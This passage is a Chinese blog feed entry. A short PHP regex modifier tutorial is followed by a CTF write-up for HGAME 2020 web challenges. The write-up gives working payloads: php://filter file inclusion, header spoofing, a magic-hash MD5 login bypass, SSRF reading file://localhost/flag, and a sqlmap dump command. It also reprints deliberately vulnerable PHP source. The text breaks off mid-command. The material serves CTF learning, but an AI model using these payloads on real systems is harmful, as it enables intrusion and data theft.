&lt;p&gt;正则表达式中常用的模式修正符有i、g、m、s、x、e等。它们之间可以组合搭配使用。&lt;/p&gt;
&lt;p&gt;它们的作用如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;//修正符:i 不区分大小写的匹配;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;//如:&amp;quot;/abc/i&amp;quot;可以与abc或aBC或ABc等匹配;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;//修正符：g表示全局匹配&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;//修正符:m 将字符串视为多行,不管是那行都能匹配;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例://模式为:$mode=&amp;quot;/abc/m&amp;quot;;
//要匹配的字符串为:$str=&amp;ldquo;bcefg5e\nabcdfe&amp;rdquo;
//注意其中\n,换行了;abc换到了下一行;
//$str和$mode仍可以匹配,修正符m使得多行也可匹配;
&lt;strong&gt;//修正符:s 将字符串视为单行,换行符作为普通字符;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例://模式为:$mode=&amp;quot;/pr.y/&amp;quot;;
//要匹配字符串为:$str=&amp;ldquo;pr\ny&amp;rdquo;;
//两者不可匹配; . 是除了换行以外的字符可匹配;
//修改下模式为:$mode=&amp;quot;/pr.y/s&amp;quot;;
//其中修正符s将\n视为普通字符,即不是换行;
//最后两者可以匹配;
&lt;strong&gt;//修正符:x 将模式中的空白忽略;&lt;/strong&gt;
&lt;strong&gt;//修正符:A 强制从目标字符串开头匹配;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例://$mode=&amp;quot;/abc/A&amp;quot;;
//可以与$str=&amp;ldquo;abcsdfi&amp;quot;匹配,
//不可以与$str2=&amp;ldquo;sdsdabc&amp;quot;匹配;
//因为$str2不是以abc开头;
&lt;strong&gt;//修正符:D 如果使用$限制结尾字符,则不允许结尾有换行;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例://模式为:$mode=&amp;quot;/abc$/&amp;quot;;
//可以与最后有换行的$str=&amp;ldquo;adshabc\n&amp;quot;匹配;
//元子符$会忽略最后的换行\n;
//如果模式为:$mode=&amp;quot;/abc/D&amp;rdquo;,
//则不能与$str=&amp;ldquo;adshabc\n&amp;quot;匹配,
&lt;strong&gt;//修正符D限制其不可有换行;必需以abc结尾;&lt;/strong&gt;
&lt;strong&gt;//修正符:U 只匹配最近的一个字符串;不重复匹配;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例:
如模式为:
$mode=&amp;quot;/a.*c/&amp;quot;;
$str=&amp;ldquo;abcabbbcabbbbbc&amp;rdquo; ;
preg_match($mode,$str,$content);
echo $content[0]; //输出:abcabbbcabbbbbc;&lt;/p&gt;
&lt;p&gt;//如果$mode=&amp;quot;/a.*c/&amp;quot;;变成$mode=&amp;quot;/a.*c/U&amp;rdquo;;
// 则只匹配最近一个字符串,输出:abc;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;//修正符:e 配合函数preg_replace()使用,&lt;/strong&gt;
可以把匹配来的字符串当作正则表达式执行;&lt;/p&gt;
&lt;h3 id=&#34;三--正则进阶&#34;&gt;三 、 正则进阶&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;3.1 捕获分组&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　先了解在正则中捕获分组的概念，其实就是一个括号内的内容 如 &amp;ldquo;(\d)\d&amp;rdquo; 而&amp;rdquo;(\d)&amp;rdquo; 这就是一个捕获分组，可以对捕获分组进行 后向引用 (如果后而有相同的内容则可以直接引用前面定义的捕获组，以简化表达式) 如(\d)\d\1 这里的&amp;quot;\1&amp;quot;就是对&amp;quot;(\d)&amp;ldquo;的后向引用&lt;/p&gt;
&lt;p&gt;那捕获分组有什么用呢看个例子就知道了&lt;/p&gt;
&lt;p&gt;如  &amp;ldquo;zery zery&amp;rdquo; 正则 \b(\w+)\b\s\1\b 所以这里的&amp;rdquo;\1&amp;quot;所捕获到的字符也是 与(\w+)一样的&amp;quot;zery&amp;quot;，为了让组名更有意义，组名是可以自定义名字的&lt;/p&gt;
&lt;p&gt;&amp;ldquo;\b(?&lt;!-- raw HTML omitted --&gt;\w+)\b\s\k&lt;!-- raw HTML omitted --&gt;\b&amp;rdquo; 用&amp;quot;?&lt;!-- raw HTML omitted --&gt;&amp;ldquo;就可以自定义组名了而要后向引用组时要记得写成 &amp;ldquo;\k&lt;!-- raw HTML omitted --&gt;&amp;quot;;自定义组名后,捕获组中匹配到的值就会保存在定义的组名里&lt;/p&gt;
&lt;p&gt;下面列出捕获分组常有的用法&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;(exp)&amp;quot;&lt;/strong&gt;   匹配exp,并捕获文本到自动命名的组里&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;(?&lt;!-- raw HTML omitted --&gt;exp)&amp;quot;&lt;/strong&gt;  匹配exp,并捕获文本到名称为name的组里&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;(?:exp)&amp;quot;&lt;/strong&gt; 匹配exp,不捕获匹配的文本，也不给此分组分配组号&lt;/p&gt;
&lt;p&gt;以下为零宽断言&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;(?=exp)&amp;quot;&lt;/strong&gt; 匹配exp前面的位置&lt;/p&gt;
&lt;p&gt;　　如 &amp;ldquo;How are you doing&amp;rdquo; 正则&amp;rdquo;(?&lt;!-- raw HTML omitted --&gt;.+(?=ing))&amp;rdquo; 这里取ing前所有的字符，并定义了一个捕获分组名字为 &amp;ldquo;txt&amp;rdquo; 而&amp;quot;txt&amp;quot;这个组里的值为&amp;quot;How are you do&amp;quot;;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;(?&amp;lt;=exp)&amp;quot;&lt;/strong&gt; 匹配exp后面的位置&lt;/p&gt;
&lt;p&gt;　　如 &amp;ldquo;How are you doing&amp;rdquo; 正则&amp;quot;(?&lt;!-- raw HTML omitted --&gt;(?&amp;lt;=How).+)&amp;quot; 这里取&amp;quot;How&amp;quot;之后所有的字符，并定义了一个捕获分组名字为 &amp;ldquo;txt&amp;rdquo; 而&amp;quot;txt&amp;quot;这个组里的值为&amp;quot; are you doing&amp;quot;;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;(?!exp)&amp;quot;&lt;/strong&gt; 匹配后面跟的不是exp的位置&lt;/p&gt;
&lt;p&gt;　　如 &amp;ldquo;123abc&amp;rdquo; 正则 &amp;ldquo;\d{3}(?!\d)&amp;ldquo;匹配3位数字后非数字的结果&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;(?&amp;lt;!exp)&amp;quot;&lt;/strong&gt; 匹配前面不是exp的位置&lt;/p&gt;
&lt;p&gt;　　如 &amp;ldquo;abc123 &amp;quot; 正则 &amp;ldquo;(?&amp;lt;![0-9])123&amp;rdquo; 匹配&amp;quot;123&amp;quot;前面是非数字的结果也可写成&amp;rdquo;(?!&amp;lt;\d)123&amp;rdquo;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HGAME 2020_Web</title>
        <link>https://anthem-whisper.github.io/p/hgame-2020_web/</link>
        <pubDate>Fri, 17 Jan 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/hgame-2020_web/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png" alt="Featured image of post HGAME 2020_Web" /&gt;&lt;p&gt;hgame2020是我第一次参加的个人赛；&lt;/p&gt;
&lt;p&gt;官方wp：https://github.com/vidar-team/Hgame2020_writeup&lt;/p&gt;
&lt;p&gt;byc_404师傅的wp：https://www.jianshu.com/p/5bb6ecd67293&lt;/p&gt;
&lt;h3 id=&#34;level-week-1&#34;&gt;level-week 1&lt;/h3&gt;
&lt;hr&gt;
&lt;h4 id=&#34;web2_接头霸王&#34;&gt;web2_接头霸王&lt;/h4&gt;
&lt;p&gt;这道题起初没有明白接头霸王是什么意思，后来做完之后才发现这个“头”指的是HTTP请求头；（灰兔子脸&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164937.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;走流程，抓包：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165020.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;You need to come from &lt;a href=&#34;https://vidar.club&#34;&gt;https://vidar.club&lt;/a&gt;&amp;rdquo;，也就是修改http头里面的referer：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165048.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;继续看：&amp;ldquo;You need to visit it locally&amp;rdquo;,显然是XFF头：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;x-forwarded-for: 127.0.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165108.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;the flag will be update after 2077,please wait for patiently&amp;rdquo;,显然不可能等到2077年，于是修改：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if-unmodified-since: Wed, 21 Oct 2077 07:28:00 GMT
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(只要是2077年之后都行)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTTP协议中的 &lt;strong&gt;If-Unmodified-Since&lt;/strong&gt; 消息头用于请求之中，使得当前请求成为条件式请求：只有当资源在指定的时间之后没有进行过修改的情况下，服务器才会返回请求的资源，或是接受 &lt;a class=&#34;link&#34; href=&#34;https://links.jianshu.com/go?to=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FHTTP%2FMethods%2FPOST&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;POST&lt;/a&gt; 或其他 non-&lt;a class=&#34;link&#34; href=&#34;https://links.jianshu.com/go?to=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FGlossary%2Fsafe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;safe&lt;/a&gt; 方法的请求。如果所请求的资源在指定的时间之后发生了修改，那么会返回 &lt;a class=&#34;link&#34; href=&#34;https://links.jianshu.com/go?to=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FHTTP%2FStatus%2F412&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;412&lt;/a&gt; (Precondition Failed) 错误。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165116.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;拿到flag；&lt;/p&gt;
&lt;h4 id=&#34;web3_codewolrd&#34;&gt;web3_codewolrd&lt;/h4&gt;
&lt;p&gt;点进去是一个403页面，f12，看源码，发现&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;里面有一行提示：&lt;/p&gt;
&lt;p&gt;This new site is building&amp;hellip;.But our stupid developer Cosmos did 302 jump to this page..F**k!&lt;/p&gt;
&lt;p&gt;应该是302跳转；&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165139.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当我们用浏览器去访问时，浏览器会自动重定向到指定的页面，而此页面并不是我们想要的含有flag的页面，通过抓包可以看到页面被重定向。因此，我们应该想办法让页面不重定向，这样就可以拿到flag了&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;于是，我就想到了 &lt;em&gt;&lt;strong&gt;curl&lt;/strong&gt;&lt;/em&gt; 这个命令，该命令只有在加参数 -L 的情况下才会重定向。&lt;/p&gt;
&lt;p&gt;Windows下curl的安装以及解决中文乱码：https://segmentfault.com/a/1190000015115481&lt;/p&gt;
&lt;p&gt;iconv是另一个工具，iconv -f utf-8 -t gbk是解决乱码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165149.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;继续试：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165154.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165200.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;看到显示的人鸡验证，知道肯定有东西（滑稽，然后这里卡了一下午，知道第二天看到题目描述才懂：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165206.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;然后是明白url里面+号需要编码：+  ——&amp;gt;  %2b  ；直接用+号表示空格；&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165211.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;使用burp suite同样可以做，只不过要抓跳转之前的包：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165305.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;拿到flag；&lt;/p&gt;
&lt;h4 id=&#34;web4_ji你太玫&#34;&gt;web4_ji你太玫&lt;/h4&gt;
&lt;p&gt;本题没有发现什么正常思路（可能是我太菜了）点进去一个页面，叫你玩游戏：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165345.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;游戏不难，通关之后，没有任何反应，所以重开故意死一次：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165400.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;3w分是不可能的，因为就算不死，每一关分数清零；然后就去burp里面看，找到一个比较可疑的history（因为是POST）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165410.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;点进去，http请求体里面有个键名叫score，恍然大悟：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165420.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;flag入手；&lt;/p&gt;
&lt;p&gt;week1题目结束；&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165427.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;level-week-2&#34;&gt;level-week 2&lt;/h3&gt;
&lt;hr&gt;
&lt;h4 id=&#34;web1_cosmos的博客后台&#34;&gt;web1_Cosmos的博客后台&lt;/h4&gt;
&lt;p&gt;点开题目：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165432.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;在burpsuite里面可以看到两个包，一个是从index.php重定向过来的，一个是login.php；&lt;/p&gt;
&lt;p&gt;由参数 &amp;lsquo;action=&amp;rsquo; 联想到文件包含漏洞（文件包含漏洞学习笔记），于是尝试使用几个PHP伪协议来读取页面的源码；&lt;/p&gt;
&lt;p&gt;这里附上几个协议的用法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165442.jpeg&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;playload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=index.php
http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=login.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以得到两个页面的（base64加密过后的）源码；&lt;/p&gt;
&lt;p&gt;login.php:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
include &amp;quot;config.php&amp;quot;;
session_start();

//Only for debug
if (DEBUG_MODE){
    if(isset($_GET[&#39;debug&#39;])) {
        $debug = $_GET[&#39;debug&#39;];
        if (!preg_match(&amp;quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&amp;quot;, $debug)) {     
            die(&amp;quot;args error!&amp;quot;);
        }
        eval(&amp;quot;var_dump($$debug);&amp;quot;);
    }
}

if(isset($_SESSION[&#39;username&#39;])) {
    header(&amp;quot;Location: admin.php&amp;quot;);
    exit();
}
else {
    if (isset($_POST[&#39;username&#39;]) &amp;amp;&amp;amp; isset($_POST[&#39;password&#39;])) {
        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;amp;&amp;amp; $_POST[&#39;username&#39;] === $admin_username){
            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];
            header(&amp;quot;Location: admin.php&amp;quot;);
            exit();
        }
        else {
            echo &amp;quot;用户名或密码错误&amp;quot;;
        }
    }
}
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;zh-CN&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;IE=edge&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;description&amp;quot; content=&amp;quot;&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;author&amp;quot; content=&amp;quot;&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;Cosmos的博客后台&amp;lt;/title&amp;gt;
    &amp;lt;link href=&amp;quot;static/signin.css&amp;quot; rel=&amp;quot;stylesheet&amp;quot;&amp;gt;
    &amp;lt;link href=&amp;quot;static/sticky-footer.css&amp;quot; rel=&amp;quot;stylesheet&amp;quot;&amp;gt;
    &amp;lt;link href=&amp;quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css&amp;quot; rel=&amp;quot;stylesheet&amp;quot;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;

&amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt;
    &amp;lt;form class=&amp;quot;form-signin&amp;quot; method=&amp;quot;post&amp;quot; action=&amp;quot;login.php&amp;quot;&amp;gt;
        &amp;lt;h2 class=&amp;quot;form-signin-heading&amp;quot;&amp;gt;后台登陆&amp;lt;/h2&amp;gt;
        &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;username&amp;quot; class=&amp;quot;form-control&amp;quot; placeholder=&amp;quot;用户名&amp;quot; required autofocus&amp;gt;
        &amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;password&amp;quot; class=&amp;quot;form-control&amp;quot; placeholder=&amp;quot;密码&amp;quot; required&amp;gt;
        &amp;lt;input class=&amp;quot;btn btn-lg btn-primary btn-block&amp;quot; type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit&amp;quot;&amp;gt;
    &amp;lt;/form&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;footer class=&amp;quot;footer&amp;quot;&amp;gt;
	&amp;lt;center&amp;gt;
	&amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt;
        &amp;lt;p class=&amp;quot;text-muted&amp;quot;&amp;gt;Created by Annevi&amp;lt;/p&amp;gt;
      &amp;lt;/div&amp;gt;
      &amp;lt;/center&amp;gt;
&amp;lt;/footer&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;index.php:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
session_start();

if(isset($_SESSION[&#39;username&#39;])) {
    header(&amp;quot;Location: admin.php&amp;quot;);
    exit();
}

$action = @$_GET[&#39;action&#39;];
$filter = &amp;quot;/config|etc|flag/i&amp;quot;;

if (isset($_GET[&#39;action&#39;]) &amp;amp;&amp;amp; !empty($_GET[&#39;action&#39;])) {
    if(preg_match($filter, $_GET[&#39;action&#39;])) {
        echo &amp;quot;Hacker get out!&amp;quot;;
        exit();
    }
    include $action;
}
elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) {
    header(&amp;quot;Location: ?action=login.php&amp;quot;);
    exit();
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;过滤了flag关键字，看来不能直接文件包含读flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165457.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;继续看，login.php里面的debug：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165502.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;（PHP中的魔术变量）意思是GET过去的debug等于什么名字就输出什么名字的变量&lt;/p&gt;
&lt;p&gt;就很nice：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://cosmos-admin.hgame.day-day.work/login.php?action=login.php&amp;amp;debug=admin_username
http://cosmos-admin.hgame.day-day.work/login.php?action=login.php&amp;amp;debug=admin_password
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以分别得到：&lt;/p&gt;
&lt;p&gt;用户名：Cosmos!&lt;/p&gt;
&lt;p&gt;密码：（md5加密后）0e114902927253523756713132279690&lt;/p&gt;
&lt;p&gt;然后密码又是弱类型判断（&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/Jie-Fei/p/9886598.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;常见MD5碰撞的playload&lt;/a&gt;）；&lt;/p&gt;
&lt;p&gt;于是输入密码 ：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;QNKCDZO
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;登录成功：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165508.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;看样子只有插入图片的地方能搞事；&lt;/p&gt;
&lt;p&gt;XSS不能读取服务器文件，那就&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/fageweiketang/article/details/88983921&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SSRF&lt;/a&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file:///flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;试一下，不行；&lt;/p&gt;
&lt;p&gt;文件包含读取admin.php:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=admin.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;admin.php:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
include &amp;quot;config.php&amp;quot;;
session_start();
if(!isset($_SESSION[&#39;username&#39;])) {
    header(&#39;Location: index.php&#39;);
    exit();
}

function insert_img() {
    if (isset($_POST[&#39;img_url&#39;])) {
        $img_url = @$_POST[&#39;img_url&#39;];
        $url_array = parse_url($img_url);
        if (@$url_array[&#39;host&#39;] !== &amp;quot;localhost&amp;quot; &amp;amp;&amp;amp; $url_array[&#39;host&#39;] !== &amp;quot;timgsa.baidu.com&amp;quot;) {
            return false;
        }   
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $img_url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        $res = curl_exec($c);
        curl_close($c);
        $avatar = base64_encode($res);

        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
            return $avatar;
        }
    }
    else {
        return base64_encode(file_get_contents(&amp;quot;static/logo.png&amp;quot;));
    }
}
?&amp;gt;

&amp;lt;html&amp;gt;
    &amp;lt;head&amp;gt;
        &amp;lt;title&amp;gt;Cosmos’ Blog - 后台管理&amp;lt;/title&amp;gt;
    &amp;lt;/head&amp;gt;
    &amp;lt;body&amp;gt;
        &amp;lt;a href=&amp;quot;logout.php&amp;quot;&amp;gt;退出登陆&amp;lt;/a&amp;gt;
        &amp;lt;div style=&amp;quot;text-align: center;&amp;quot;&amp;gt;
            &amp;lt;h1&amp;gt;Welcome &amp;lt;?php echo $_SESSION[&#39;username&#39;];?&amp;gt; &amp;lt;/h1&amp;gt;
        &amp;lt;/div&amp;gt;
        &amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
            &amp;lt;fieldset style=&amp;quot;width: 30%;height: 20%;float:left&amp;quot;&amp;gt;
                &amp;lt;legend&amp;gt;插入图片&amp;lt;/legend&amp;gt;
                &amp;lt;p&amp;gt;&amp;lt;label&amp;gt;图片url: &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;img_url&amp;quot; placeholder=&amp;quot;&amp;quot;&amp;gt;&amp;lt;/label&amp;gt;&amp;lt;/p&amp;gt;
                &amp;lt;p&amp;gt;&amp;lt;button type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot;&amp;gt;插入&amp;lt;/button&amp;gt;&amp;lt;/p&amp;gt;
            &amp;lt;/fieldset&amp;gt;
        &amp;lt;/form&amp;gt;
        &amp;lt;fieldset style=&amp;quot;width: 30%;height: 20%;float:left&amp;quot;&amp;gt;
                &amp;lt;legend&amp;gt;评论管理&amp;lt;/legend&amp;gt;
                &amp;lt;h2&amp;gt;待开发..&amp;lt;/h2&amp;gt;
        &amp;lt;/fieldset&amp;gt;
        &amp;lt;fieldset style=&amp;quot;width: 30%;height: 20%;&amp;quot;&amp;gt;
                &amp;lt;legend&amp;gt;文章列表&amp;lt;/legend&amp;gt;
                &amp;lt;h2&amp;gt;待开发..&amp;lt;/h2&amp;gt;
        &amp;lt;/fieldset&amp;gt;
        &amp;lt;fieldset style=&amp;quot;height: 50%&amp;quot;&amp;gt;
            &amp;lt;div style=&amp;quot;text-align: center;&amp;quot;&amp;gt;
                &amp;lt;img height=&#39;200&#39; width=&#39;500&#39; src=&#39;data:image/jpeg;base64,&amp;lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&amp;quot;static/error.jpg&amp;quot;)); ?&amp;gt;&#39;&amp;gt;
            &amp;lt;/div&amp;gt;
        &amp;lt;/fieldset&amp;gt;
    &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;看到有一个过滤:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165525.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;于是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file://localhost/flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165535.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;aGdhbWV7cEhwXzFzX1RoM19CM3NUX0w0bkd1NGdFIUAhfQo=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;base64解码：&lt;/p&gt;
&lt;p&gt;hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}&lt;/p&gt;
&lt;h4 id=&#34;cosmos的留言板&#34;&gt;Cosmos的留言板&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165546.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;最开始没有发现什么思路，后来是用kali下的sqlmap扫了出来，这里要用到sqlmap的tamper&lt;/p&gt;
&lt;p&gt;这里就直接上playload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sqlmap -u &amp;quot;http://139.199.182.61/index.php?id=1&amp;quot; -D easysql -T f1aggggggggggggg -C fl4444444g --dump --tamper &amp;quot;randomcase.py,space2comment.py&amp;quot;
